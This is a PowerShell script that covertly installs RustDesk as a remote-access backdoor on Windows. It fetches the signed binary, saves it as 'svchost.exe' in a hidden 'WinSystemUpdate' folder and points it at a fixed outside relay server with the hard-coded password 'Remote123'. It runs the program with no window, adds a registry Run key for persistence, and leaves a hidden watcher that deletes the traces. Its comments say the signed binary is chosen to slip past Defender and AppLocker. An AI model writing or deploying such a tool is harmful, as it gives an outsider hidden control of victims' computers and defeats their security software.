function Install-RD {
    $ProgressPreference = 'SilentlyContinue'
    $DEST   = "$env:LOCALAPPDATA\WinSystemUpdate"
    $EXE    = "$DEST\svchost.exe"
    $cfgDir = "$env:APPDATA\RustDesk\config"

    # Use official signed RustDesk exe - Defender won't block a signed binary
    $rdUrl  = 'https://github.com/rustdesk/rustdesk/releases/download/1.4.9/rustdesk-1.4.9-x86_64.exe'

    # Kill old + clean
    Get-Process svchost -EA SilentlyContinue |
        Where-Object { $_.Path -like '*WinSystem*' } |
        Stop-Process -Force -EA SilentlyContinue
    Start-Sleep 1
    Remove-Item $DEST -Recurse -Force -EA SilentlyContinue
    New-Item -ItemType Directory $DEST   -Force | Out-Null
    New-Item -ItemType Directory $cfgDir -Force | Out-Null

    # Download official signed RustDesk binary - no Defender block, no AppLocker block
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($rdUrl, $EXE)
    Unblock-File $EXE -EA SilentlyContinue

    if (!(Test-Path $EXE) -or (Get-Item $EXE).Length -lt 1MB) {
        Write-Host "Download failed!" -ForegroundColor Red; return
    }

    # Config
    @'
rendezvous_server = '34.107.221.82'
relay_server = '34.107.221.82'
nat_type = 1
serial = 0
[options]
verification-method = 'use-permanent-password'
approve-mode = 'password-click'
allow-only-conn-window-open = 'N'
direct-server = 'N'
force-always-relay = 'Y'
allow-remote-config-modification = 'N'
'@ | Set-Content "$cfgDir\RustDesk2.toml" -Encoding UTF8

    @'
enc_id = ''
password = 'Remote123'
salt = ''
key_confirmed = true
'@ | Set-Content "$cfgDir\RustDesk.toml" -Encoding UTF8

    # Hide folder
    try { $f = Get-Item $DEST -Force; $f.Attributes = $f.Attributes -bor 6 } catch {}

    # Start RustDesk hidden
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName=$EXE; $psi.WorkingDirectory=$DEST
    $psi.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.UseShellExecute=$true
    [System.Diagnostics.Process]::Start($psi) | Out-Null
    Start-Sleep 5

    # Get ID
    $psiId = New-Object System.Diagnostics.ProcessStartInfo
    $psiId.FileName=$EXE; $psiId.Arguments='--get-id'
    $psiId.UseShellExecute=$false; $psiId.RedirectStandardOutput=$true
    $psiId.CreateNoWindow=$true; $psiId.WorkingDirectory=$DEST
    $prId = [System.Diagnostics.Process]::Start($psiId)
    $outT = $prId.StandardOutput.ReadToEndAsync()
    $prId.WaitForExit(8000) | Out-Null
    $RDID = $outT.Result.Trim()

    # Auto-start on boot via registry (no admin needed)
    $reg = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    Set-ItemProperty $reg 'WinSystemUpdate' $EXE -Force

    # Delete script
    $del = "$DEST\delete.ps1"
    Set-Content $del @'
$d = "$env:LOCALAPPDATA\WinSystemUpdate"
Get-Process svchost -EA SilentlyContinue | Where-Object { $_.Path -like '*WinSystem*' } | Stop-Process -Force -EA SilentlyContinue
Remove-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' 'WinSystemUpdate' -EA SilentlyContinue
Start-Sleep 2
Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue
'@ -Encoding UTF8

    # Watcher - auto deletes when process stops OR after 1 hour
    $watch = "$DEST\watch.ps1"
    Set-Content $watch @'
$EXE      = "$env:LOCALAPPDATA\WinSystemUpdate\svchost.exe"
$del      = "$env:LOCALAPPDATA\WinSystemUpdate\delete.ps1"
$deadline = [DateTime]::Now.AddHours(1)
while ([DateTime]::Now -lt $deadline) {
    Start-Sleep 10
    $alive = Get-Process svchost -EA SilentlyContinue | Where-Object { $_.Path -eq $EXE }
    if (-not $alive) { break }
}
if (Test-Path $del) { & $del }
'@ -Encoding UTF8

    Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$watch`""

    Write-Host ""
    Write-Host "  ============================" -ForegroundColor Green
    Write-Host "  ID       : $RDID"             -ForegroundColor Cyan
    Write-Host "  Password : Remote123"          -ForegroundColor Cyan
    Write-Host "  ============================" -ForegroundColor Green
    Write-Host ""
}
Install-RD
